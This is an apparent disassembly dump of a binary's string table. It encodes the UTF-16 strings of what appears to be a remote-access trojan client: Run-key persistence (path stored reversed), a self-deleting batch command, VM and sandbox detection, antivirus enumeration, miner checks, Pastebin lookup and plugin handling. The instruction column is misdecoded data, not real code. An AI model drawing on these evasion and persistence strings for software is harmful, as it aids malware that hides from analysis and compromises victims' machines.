  4094fb:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  4094ff:	00 77 00             	add    %dh,0x0(%edi)
  409502:	6f                   	outsl  %ds:(%esi),(%dx)
  409503:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  409507:	00 69 00             	add    %ch,0x0(%ecx)
  40950a:	57                   	push   %edi
  40950b:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40950f:	00 66 00             	add    %ah,0x0(%esi)
  409512:	6f                   	outsl  %ds:(%esi),(%dx)
  409513:	00 73 00             	add    %dh,0x0(%ebx)
  409516:	6f                   	outsl  %ds:(%esi),(%dx)
  409517:	00 72 00             	add    %dh,0x0(%edx)
  40951a:	63 00                	arpl   %eax,(%eax)
  40951c:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  409522:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409526:	61                   	popa
  409527:	00 77 00             	add    %dh,0x0(%edi)
  40952a:	74 00                	je     0x40952c
  40952c:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  409530:	53                   	push   %ebx
  409531:	00 00                	add    %al,(%eax)
  409533:	03 22                	add    (%edx),%esp
  409535:	00 00                	add    %al,(%eax)
  409537:	09 2e                	or     %ebp,(%esi)
  409539:	00 62 00             	add    %ah,0x0(%edx)
  40953c:	61                   	popa
  40953d:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  409541:	13 40 00             	adc    0x0(%eax),%eax
  409544:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409548:	68 00 6f 00 20       	push   $0x20006f00
  40954d:	00 6f 00             	add    %ch,0x0(%edi)
  409550:	66 00 66 00          	data16 add %ah,0x0(%esi)
  409554:	00 1f                	add    %bl,(%edi)
  409556:	74 00                	je     0x409558
  409558:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40955e:	6f                   	outsl  %ds:(%esi),(%dx)
  40955f:	00 75 00             	add    %dh,0x0(%ebp)
  409562:	74 00                	je     0x409564
  409564:	20 00                	and    %al,(%eax)
  409566:	33 00                	xor    (%eax),%eax
  409568:	20 00                	and    %al,(%eax)
  40956a:	3e 00 20             	add    %ah,%ds:(%eax)
  40956d:	00 4e 00             	add    %cl,0x0(%esi)
  409570:	55                   	push   %ebp
  409571:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  409575:	15 53 00 54 00       	adc    $0x540053,%eax
  40957a:	41                   	inc    %ecx
  40957b:	00 52 00             	add    %dl,0x0(%edx)
  40957e:	54                   	push   %esp
  40957f:	00 20                	add    %ah,(%eax)
  409581:	00 22                	add    %ah,(%edx)
  409583:	00 22                	add    %ah,(%edx)
  409585:	00 20                	add    %ah,(%eax)
  409587:	00 22                	add    %ah,(%edx)
  409589:	00 00                	add    %al,(%eax)
  40958b:	07                   	pop    %es
  40958c:	43                   	inc    %ebx
  40958d:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  409591:	00 00                	add    %al,(%eax)
  409593:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  409597:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40959b:	00 22                	add    %ah,(%edx)
  40959d:	00 00                	add    %al,(%eax)
  40959f:	0f 22 00             	mov    %eax,%cr0
  4095a2:	20 00                	and    %al,(%eax)
  4095a4:	2f                   	das
  4095a5:	00 66 00             	add    %ah,0x0(%esi)
  4095a8:	20 00                	and    %al,(%eax)
  4095aa:	2f                   	das
  4095ab:	00 71 00             	add    %dh,0x0(%ecx)
  4095ae:	00 05 78 00 70 00    	add    %al,0x700078
  4095b4:	00 45 53             	add    %al,0x53(%ebp)
  4095b7:	00 65 00             	add    %ah,0x0(%ebp)
  4095ba:	6c                   	insb   (%dx),%es:(%edi)
  4095bb:	00 65 00             	add    %ah,0x0(%ebp)
  4095be:	63 00                	arpl   %eax,(%eax)
  4095c0:	74 00                	je     0x4095c2
  4095c2:	20 00                	and    %al,(%eax)
  4095c4:	2a 00                	sub    (%eax),%al
  4095c6:	20 00                	and    %al,(%eax)
  4095c8:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4095cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4095cd:	00 6d 00             	add    %ch,0x0(%ebp)
  4095d0:	20 00                	and    %al,(%eax)
  4095d2:	57                   	push   %edi
  4095d3:	00 69 00             	add    %ch,0x0(%ecx)
  4095d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d7:	00 33                	add    %dh,(%ebx)
  4095d9:	00 32                	add    %dh,(%edx)
  4095db:	00 5f 00             	add    %bl,0x0(%edi)
  4095de:	43                   	inc    %ebx
  4095df:	00 6f 00             	add    %ch,0x0(%edi)
  4095e2:	6d                   	insl   (%dx),%es:(%edi)
  4095e3:	00 70 00             	add    %dh,0x0(%eax)
  4095e6:	75 00                	jne    0x4095e8
  4095e8:	74 00                	je     0x4095ea
  4095ea:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4095ee:	53                   	push   %ebx
  4095ef:	00 79 00             	add    %bh,0x0(%ecx)
  4095f2:	73 00                	jae    0x4095f4
  4095f4:	74 00                	je     0x4095f6
  4095f6:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4095fa:	00 19                	add    %bl,(%ecx)
  4095fc:	4d                   	dec    %ebp
  4095fd:	00 61 00             	add    %ah,0x0(%ecx)
  409600:	6e                   	outsb  %ds:(%esi),(%dx)
  409601:	00 75 00             	add    %dh,0x0(%ebp)
  409604:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  409608:	63 00                	arpl   %eax,(%eax)
  40960a:	74 00                	je     0x40960c
  40960c:	75 00                	jne    0x40960e
  40960e:	72 00                	jb     0x409610
  409610:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409614:	00 2b                	add    %ch,(%ebx)
  409616:	6d                   	insl   (%dx),%es:(%edi)
  409617:	00 69 00             	add    %ch,0x0(%ecx)
  40961a:	63 00                	arpl   %eax,(%eax)
  40961c:	72 00                	jb     0x40961e
  40961e:	6f                   	outsl  %ds:(%esi),(%dx)
  40961f:	00 73 00             	add    %dh,0x0(%ebx)
  409622:	6f                   	outsl  %ds:(%esi),(%dx)
  409623:	00 66 00             	add    %ah,0x0(%esi)
  409626:	74 00                	je     0x409628
  409628:	20 00                	and    %al,(%eax)
  40962a:	63 00                	arpl   %eax,(%eax)
  40962c:	6f                   	outsl  %ds:(%esi),(%dx)
  40962d:	00 72 00             	add    %dh,0x0(%edx)
  409630:	70 00                	jo     0x409632
  409632:	6f                   	outsl  %ds:(%esi),(%dx)
  409633:	00 72 00             	add    %dh,0x0(%edx)
  409636:	61                   	popa
  409637:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40963b:	00 6f 00             	add    %ch,0x0(%edi)
  40963e:	6e                   	outsb  %ds:(%esi),(%dx)
  40963f:	00 00                	add    %al,(%eax)
  409641:	0b 4d 00             	or     0x0(%ebp),%ecx
  409644:	6f                   	outsl  %ds:(%esi),(%dx)
  409645:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409649:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40964d:	0f 56 00             	orps   (%eax),%xmm0
  409650:	49                   	dec    %ecx
  409651:	00 52 00             	add    %dl,0x0(%edx)
  409654:	54                   	push   %esp
  409655:	00 55 00             	add    %dl,0x0(%ebp)
  409658:	41                   	inc    %ecx
  409659:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40965d:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  409662:	77 00                	ja     0x409664
  409664:	61                   	popa
  409665:	00 72 00             	add    %dh,0x0(%edx)
  409668:	65 00 00             	add    %al,%gs:(%eax)
  40966b:	15 56 00 69 00       	adc    $0x690056,%eax
  409670:	72 00                	jb     0x409672
  409672:	74 00                	je     0x409674
  409674:	75 00                	jne    0x409676
  409676:	61                   	popa
  409677:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40967b:	00 6f 00             	add    %ch,0x0(%edi)
  40967e:	78 00                	js     0x409680
  409680:	00 17                	add    %dl,(%edi)
  409682:	53                   	push   %ebx
  409683:	00 62 00             	add    %ah,0x0(%edx)
  409686:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40968c:	6c                   	insb   (%dx),%es:(%edi)
  40968d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  409691:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409695:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409699:	1f                   	pop    %ds
  40969a:	2d 00 2d 00 64       	sub    $0x64002d00,%eax
  40969f:	00 6f 00             	add    %ch,0x0(%edi)
  4096a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4096a3:	00 61 00             	add    %ah,0x0(%ecx)
  4096a6:	74 00                	je     0x4096a8
  4096a8:	65 00 2d 00 6c 00 65 	add    %ch,%gs:0x65006c00
  4096af:	00 76 00             	add    %dh,0x0(%esi)
  4096b2:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
  4096b7:	00 01                	add    %al,(%ecx)
  4096b9:	03 31                	add    (%ecx),%esi
  4096bb:	00 00                	add    %al,(%eax)
  4096bd:	71 53                	jno    0x409712
  4096bf:	00 45 00             	add    %al,0x0(%ebp)
  4096c2:	4c                   	dec    %esp
  4096c3:	00 45 00             	add    %al,0x0(%ebp)
  4096c6:	43                   	inc    %ebx
  4096c7:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4096cb:	00 43 00             	add    %al,0x0(%ebx)
  4096ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4096cf:	00 6d 00             	add    %ch,0x0(%ebp)
  4096d2:	6d                   	insl   (%dx),%es:(%edi)
  4096d3:	00 61 00             	add    %ah,0x0(%ecx)
  4096d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4096d7:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  4096db:	00 69 00             	add    %ch,0x0(%ecx)
  4096de:	6e                   	outsb  %ds:(%esi),(%dx)
  4096df:	00 65 00             	add    %ah,0x0(%ebp)
  4096e2:	20 00                	and    %al,(%eax)
  4096e4:	46                   	inc    %esi
  4096e5:	00 52 00             	add    %dl,0x0(%edx)
  4096e8:	4f                   	dec    %edi
  4096e9:	00 4d 00             	add    %cl,0x0(%ebp)
  4096ec:	20 00                	and    %al,(%eax)
  4096ee:	57                   	push   %edi
  4096ef:	00 69 00             	add    %ch,0x0(%ecx)
  4096f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4096f3:	00 33                	add    %dh,(%ebx)
  4096f5:	00 32                	add    %dh,(%edx)
  4096f7:	00 5f 00             	add    %bl,0x0(%edi)
  4096fa:	50                   	push   %eax
  4096fb:	00 72 00             	add    %dh,0x0(%edx)
  4096fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4096ff:	00 63 00             	add    %ah,0x0(%ebx)
  409702:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409706:	73 00                	jae    0x409708
  409708:	20 00                	and    %al,(%eax)
  40970a:	57                   	push   %edi
  40970b:	00 48 00             	add    %cl,0x0(%eax)
  40970e:	45                   	inc    %ebp
  40970f:	00 52 00             	add    %dl,0x0(%edx)
  409712:	45                   	inc    %ebp
  409713:	00 20                	add    %ah,(%eax)
  409715:	00 50 00             	add    %dl,0x0(%eax)
  409718:	72 00                	jb     0x40971a
  40971a:	6f                   	outsl  %ds:(%esi),(%dx)
  40971b:	00 63 00             	add    %ah,0x0(%ebx)
  40971e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409722:	73 00                	jae    0x409724
  409724:	49                   	dec    %ecx
  409725:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  409729:	00 3d 00 20 00 00    	add    %bh,0x2000
  40972f:	17                   	pop    %ss
  409730:	43                   	inc    %ebx
  409731:	00 6f 00             	add    %ch,0x0(%edi)
  409734:	6d                   	insl   (%dx),%es:(%edi)
  409735:	00 6d 00             	add    %ch,0x0(%ebp)
  409738:	61                   	popa
  409739:	00 6e 00             	add    %ch,0x0(%esi)
  40973c:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  409741:	00 6e 00             	add    %ch,0x0(%esi)
  409744:	65 00 00             	add    %al,%gs:(%eax)
  409747:	11 45 00             	adc    %eax,0x0(%ebp)
  40974a:	72 00                	jb     0x40974c
  40974c:	72 00                	jb     0x40974e
  40974e:	20 00                	and    %al,(%eax)
  409750:	48                   	dec    %eax
  409751:	00 57 00             	add    %dl,0x0(%edi)
  409754:	49                   	dec    %ecx
  409755:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  409759:	05 78 00 32 00       	add    $0x320078,%eax
  40975e:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  409764:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40976a:	74 00                	je     0x40976c
  40976c:	49                   	dec    %ecx
  40976d:	00 6e 00             	add    %ch,0x0(%esi)
  409770:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  409774:	00 09                	add    %cl,(%ecx)
  409776:	48                   	dec    %eax
  409777:	00 57 00             	add    %dl,0x0(%edi)
  40977a:	49                   	dec    %ecx
  40977b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40977f:	09 55 00             	or     %edx,0x0(%ebp)
  409782:	73 00                	jae    0x409784
  409784:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409788:	00 05 4f 00 53 00    	add    %al,0x53004f
  40978e:	00 13                	add    %dl,(%ebx)
  409790:	4d                   	dec    %ebp
  409791:	00 69 00             	add    %ch,0x0(%ecx)
  409794:	63 00                	arpl   %eax,(%eax)
  409796:	72 00                	jb     0x409798
  409798:	6f                   	outsl  %ds:(%esi),(%dx)
  409799:	00 73 00             	add    %dh,0x0(%ebx)
  40979c:	6f                   	outsl  %ds:(%esi),(%dx)
  40979d:	00 66 00             	add    %ah,0x0(%esi)
  4097a0:	74 00                	je     0x4097a2
  4097a2:	00 03                	add    %al,(%ebx)
  4097a4:	20 00                	and    %al,(%eax)
  4097a6:	00 09                	add    %cl,(%ecx)
  4097a8:	54                   	push   %esp
  4097a9:	00 72 00             	add    %dh,0x0(%edx)
  4097ac:	75 00                	jne    0x4097ae
  4097ae:	65 00 00             	add    %al,%gs:(%eax)
  4097b1:	0b 36                	or     (%esi),%esi
  4097b3:	00 34 00             	add    %dh,(%eax,%eax,1)
  4097b6:	62 00                	bound  %eax,(%eax)
  4097b8:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  4097be:	46                   	inc    %esi
  4097bf:	00 61 00             	add    %ah,0x0(%ecx)
  4097c2:	6c                   	insb   (%dx),%es:(%edi)
  4097c3:	00 73 00             	add    %dh,0x0(%ebx)
  4097c6:	65 00 00             	add    %al,%gs:(%eax)
  4097c9:	0b 33                	or     (%ebx),%esi
  4097cb:	00 32                	add    %dh,(%edx)
  4097cd:	00 62 00             	add    %ah,0x0(%edx)
  4097d0:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  4097d6:	50                   	push   %eax
  4097d7:	00 61 00             	add    %ah,0x0(%ecx)
  4097da:	74 00                	je     0x4097dc
  4097dc:	68 00 00 0f 56       	push   $0x560f0000
  4097e1:	00 65 00             	add    %ah,0x0(%ebp)
  4097e4:	72 00                	jb     0x4097e6
  4097e6:	73 00                	jae    0x4097e8
  4097e8:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4097ee:	00 0b                	add    %cl,(%ebx)
  4097f0:	41                   	inc    %ecx
  4097f1:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  4097f5:	00 69 00             	add    %ch,0x0(%ecx)
  4097f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f9:	00 00                	add    %al,(%eax)
  4097fb:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  4097ff:	00 75 00             	add    %dh,0x0(%ebp)
  409802:	65 00 00             	add    %al,%gs:(%eax)
  409805:	0b 66 00             	or     0x0(%esi),%esp
  409808:	61                   	popa
  409809:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40980d:	00 65 00             	add    %ah,0x0(%ebp)
  409810:	00 17                	add    %dl,(%edi)
  409812:	50                   	push   %eax
  409813:	00 65 00             	add    %ah,0x0(%ebp)
  409816:	72 00                	jb     0x409818
  409818:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40981c:	72 00                	jb     0x40981e
  40981e:	6d                   	insl   (%dx),%es:(%edi)
  40981f:	00 61 00             	add    %ah,0x0(%ecx)
  409822:	6e                   	outsb  %ds:(%esi),(%dx)
  409823:	00 63 00             	add    %ah,0x0(%ebx)
  409826:	65 00 00             	add    %al,%gs:(%eax)
  409829:	11 50 00             	adc    %edx,0x0(%eax)
  40982c:	61                   	popa
  40982d:	00 73 00             	add    %dh,0x0(%ebx)
  409830:	74 00                	je     0x409832
  409832:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  409836:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40983c:	41                   	inc    %ecx
  40983d:	00 6e 00             	add    %ch,0x0(%esi)
  409840:	74 00                	je     0x409842
  409842:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  409848:	72 00                	jb     0x40984a
  40984a:	75 00                	jne    0x40984c
  40984c:	73 00                	jae    0x40984e
  40984e:	00 13                	add    %dl,(%ebx)
  409850:	49                   	dec    %ecx
  409851:	00 6e 00             	add    %ch,0x0(%esi)
  409854:	73 00                	jae    0x409856
  409856:	74 00                	je     0x409858
  409858:	61                   	popa
  409859:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40985d:	00 65 00             	add    %ah,0x0(%ebp)
  409860:	64 00 00             	add    %al,%fs:(%eax)
  409863:	09 50 00             	or     %edx,0x0(%eax)
  409866:	6f                   	outsl  %ds:(%esi),(%dx)
  409867:	00 6e 00             	add    %ch,0x0(%esi)
  40986a:	67 00 00             	add    %al,(%bx,%si)
  40986d:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  409872:	00 2b                	add    %ch,(%ebx)
  409874:	5c                   	pop    %esp
  409875:	00 72 00             	add    %dh,0x0(%edx)
  409878:	6f                   	outsl  %ds:(%esi),(%dx)
  409879:	00 6f 00             	add    %ch,0x0(%edi)
  40987c:	74 00                	je     0x40987e
  40987e:	5c                   	pop    %esp
  40987f:	00 53 00             	add    %dl,0x0(%ebx)
  409882:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409886:	75 00                	jne    0x409888
  409888:	72 00                	jb     0x40988a
  40988a:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  409890:	43                   	inc    %ebx
  409891:	00 65 00             	add    %ah,0x0(%ebp)
  409894:	6e                   	outsb  %ds:(%esi),(%dx)
  409895:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409899:	00 72 00             	add    %dh,0x0(%edx)
  40989c:	32 00                	xor    (%eax),%al
  40989e:	00 3d 53 00 65 00    	add    %bh,0x650053
  4098a4:	6c                   	insb   (%dx),%es:(%edi)
  4098a5:	00 65 00             	add    %ah,0x0(%ebp)
  4098a8:	63 00                	arpl   %eax,(%eax)
  4098aa:	74 00                	je     0x4098ac
  4098ac:	20 00                	and    %al,(%eax)
  4098ae:	2a 00                	sub    (%eax),%al
  4098b0:	20 00                	and    %al,(%eax)
  4098b2:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4098b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4098b7:	00 6d 00             	add    %ch,0x0(%ebp)
  4098ba:	20 00                	and    %al,(%eax)
  4098bc:	41                   	inc    %ecx
  4098bd:	00 6e 00             	add    %ch,0x0(%esi)
  4098c0:	74 00                	je     0x4098c2
  4098c2:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  4098c8:	72 00                	jb     0x4098ca
  4098ca:	75 00                	jne    0x4098cc
  4098cc:	73 00                	jae    0x4098ce
  4098ce:	50                   	push   %eax
  4098cf:	00 72 00             	add    %dh,0x0(%edx)
  4098d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d3:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  4098d7:	00 63 00             	add    %ah,0x0(%ebx)
  4098da:	74 00                	je     0x4098dc
  4098dc:	00 17                	add    %dl,(%edi)
  4098de:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4098e2:	73 00                	jae    0x4098e4
  4098e4:	70 00                	jo     0x4098e6
  4098e6:	6c                   	insb   (%dx),%es:(%edi)
  4098e7:	00 61 00             	add    %ah,0x0(%ecx)
  4098ea:	79 00                	jns    0x4098ec
  4098ec:	4e                   	dec    %esi
  4098ed:	00 61 00             	add    %ah,0x0(%ecx)
  4098f0:	6d                   	insl   (%dx),%es:(%edi)
  4098f1:	00 65 00             	add    %ah,0x0(%ebp)
  4098f4:	00 07                	add    %al,(%edi)
  4098f6:	4e                   	dec    %esi
  4098f7:	00 2f                	add    %ch,(%edi)
  4098f9:	00 41 00             	add    %al,0x0(%ecx)
  4098fc:	00 05 2c 00 20 00    	add    %al,0x20002c
  409902:	00 13                	add    %dl,(%ebx)
  409904:	53                   	push   %ebx
  409905:	00 6f 00             	add    %ch,0x0(%edi)
  409908:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40990d:	00 61 00             	add    %ah,0x0(%ecx)
  409910:	72 00                	jb     0x409912
  409912:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  409917:	09 70 00             	or     %esi,0x0(%eax)
  40991a:	6f                   	outsl  %ds:(%esi),(%dx)
  40991b:	00 6e 00             	add    %ch,0x0(%esi)
  40991e:	67 00 00             	add    %al,(%bx,%si)
  409921:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  409926:	75 00                	jne    0x409928
  409928:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40992c:	6e                   	outsb  %ds:(%esi),(%dx)
  40992d:	00 00                	add    %al,(%eax)
  40992f:	15 73 00 61 00       	adc    $0x610073,%eax
  409934:	76 00                	jbe    0x409936
  409936:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40993a:	6c                   	insb   (%dx),%es:(%edi)
  40993b:	00 75 00             	add    %dh,0x0(%ebp)
  40993e:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  409942:	6e                   	outsb  %ds:(%esi),(%dx)
  409943:	00 00                	add    %al,(%eax)
  409945:	07                   	pop    %es
  409946:	44                   	inc    %esp
  409947:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40994b:	00 00                	add    %al,(%eax)
  40994d:	15 73 00 65 00       	adc    $0x650073,%eax
  409952:	6e                   	outsb  %ds:(%esi),(%dx)
  409953:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  409957:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40995b:	00 67 00             	add    %ah,0x0(%edi)
  40995e:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  409964:	48                   	dec    %eax
  409965:	00 61 00             	add    %ah,0x0(%ecx)
  409968:	73 00                	jae    0x40996a
  40996a:	68 00 65 00 73       	push   $0x73006500
  40996f:	00 00                	add    %al,(%eax)
  409971:	09 48 00             	or     %ecx,0x0(%eax)
  409974:	61                   	popa
  409975:	00 73 00             	add    %dh,0x0(%ebx)
  409978:	68 00 00 1b 50       	push   $0x501b0000
  40997d:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  409981:	00 67 00             	add    %ah,0x0(%edi)
  409984:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40998a:	50                   	push   %eax
  40998b:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40998f:	00 67 00             	add    %ah,0x0(%edi)
  409992:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  409998:	52                   	push   %edx
  409999:	00 75 00             	add    %dh,0x0(%ebp)
  40999c:	6e                   	outsb  %ds:(%esi),(%dx)
  40999d:	00 00                	add    %al,(%eax)
  40999f:	0f 4d 00             	cmovge (%eax),%eax
  4099a2:	73 00                	jae    0x4099a4
  4099a4:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  4099a8:	61                   	popa
  4099a9:	00 63 00             	add    %ah,0x0(%ebx)
  4099ac:	6b 00 00             	imul   $0x0,(%eax),%eax
  4099af:	11 52 00             	adc    %edx,0x0(%edx)
  4099b2:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4099b6:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  4099ba:	76 00                	jbe    0x4099bc
  4099bc:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4099c1:	0b 45 00             	or     0x0(%ebp),%eax
  4099c4:	72 00                	jb     0x4099c6
  4099c6:	72 00                	jb     0x4099c8
  4099c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4099c9:	00 72 00             	add    %dh,0x0(%edx)
  4099cc:	00 47 6d             	add    %al,0x6d(%edi)
  4099cf:	00 61 00             	add    %ah,0x0(%ecx)
  4099d2:	73 00                	jae    0x4099d4
  4099d4:	74 00                	je     0x4099d6
  4099d6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4099da:	4b                   	dec    %ebx
  4099db:	00 65 00             	add    %ah,0x0(%ebp)
  4099de:	79 00                	jns    0x4099e0
  4099e0:	20 00                	and    %al,(%eax)
  4099e2:	63 00                	arpl   %eax,(%eax)
  4099e4:	61                   	popa
  4099e5:	00 6e 00             	add    %ch,0x0(%esi)
  4099e8:	20 00                	and    %al,(%eax)
  4099ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4099eb:	00 6f 00             	add    %ch,0x0(%edi)
  4099ee:	74 00                	je     0x4099f0
  4099f0:	20 00                	and    %al,(%eax)
  4099f2:	62 00                	bound  %eax,(%eax)
  4099f4:	65 00 20             	add    %ah,%gs:(%eax)
  4099f7:	00 6e 00             	add    %ch,0x0(%esi)
  4099fa:	75 00                	jne    0x4099fc
  4099fc:	6c                   	insb   (%dx),%es:(%edi)
  4099fd:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  409a01:	00 6f 00             	add    %ch,0x0(%edi)
  409a04:	72 00                	jb     0x409a06
  409a06:	20 00                	and    %al,(%eax)
  409a08:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409a0c:	70 00                	jo     0x409a0e
  409a0e:	74 00                	je     0x409a10
  409a10:	79 00                	jns    0x409a12
  409a12:	2e 00 00             	add    %al,%cs:(%eax)
  409a15:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  409a1a:	70 00                	jo     0x409a1c
  409a1c:	75 00                	jne    0x409a1e
  409a1e:	74 00                	je     0x409a20
  409a20:	20 00                	and    %al,(%eax)
  409a22:	63 00                	arpl   %eax,(%eax)
  409a24:	61                   	popa
  409a25:	00 6e 00             	add    %ch,0x0(%esi)
  409a28:	20 00                	and    %al,(%eax)
  409a2a:	6e                   	outsb  %ds:(%esi),(%dx)
  409a2b:	00 6f 00             	add    %ch,0x0(%edi)
  409a2e:	74 00                	je     0x409a30
  409a30:	20 00                	and    %al,(%eax)
  409a32:	62 00                	bound  %eax,(%eax)
  409a34:	65 00 20             	add    %ah,%gs:(%eax)
  409a37:	00 6e 00             	add    %ch,0x0(%esi)
  409a3a:	75 00                	jne    0x409a3c
  409a3c:	6c                   	insb   (%dx),%es:(%edi)
  409a3d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  409a41:	00 00                	add    %al,(%eax)
  409a43:	55                   	push   %ebp
  409a44:	49                   	dec    %ecx
  409a45:	00 6e 00             	add    %ch,0x0(%esi)
  409a48:	76 00                	jbe    0x409a4a
  409a4a:	61                   	popa
  409a4b:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409a4f:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  409a53:	00 6d 00             	add    %ch,0x0(%ebp)
  409a56:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409a5a:	73 00                	jae    0x409a5c
  409a5c:	61                   	popa
  409a5d:	00 67 00             	add    %ah,0x0(%edi)
  409a60:	65 00 20             	add    %ah,%gs:(%eax)
  409a63:	00 61 00             	add    %ah,0x0(%ecx)
  409a66:	75 00                	jne    0x409a68
  409a68:	74 00                	je     0x409a6a
  409a6a:	68 00 65 00 6e       	push   $0x6e006500
  409a6f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409a73:	00 63 00             	add    %ah,0x0(%ebx)
  409a76:	61                   	popa
  409a77:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409a7b:	00 6f 00             	add    %ch,0x0(%edi)
  409a7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7f:	00 20                	add    %ah,(%eax)
  409a81:	00 63 00             	add    %ah,0x0(%ebx)
  409a84:	6f                   	outsl  %ds:(%esi),(%dx)
  409a85:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409a89:	00 20                	add    %ah,(%eax)
  409a8b:	00 28                	add    %ch,(%eax)
  409a8d:	00 4d 00             	add    %cl,0x0(%ebp)
  409a90:	41                   	inc    %ecx
  409a91:	00 43 00             	add    %al,0x0(%ebx)
  409a94:	29 00                	sub    %eax,(%eax)
  409a96:	2e 00 00             	add    %al,%cs:(%eax)
  409a99:	05 58 00 32 00       	add    $0x320058,%eax
  409a9e:	00 00                	add    %al,(%eax)
  409aa0:	36 9d                	ss popf
  409aa2:	ff a4 36 e0 75 45 af 	jmp    *-0x50ba8a20(%esi,%esi,1)
  409aa9:	eb 5b                	jmp    0x409b06
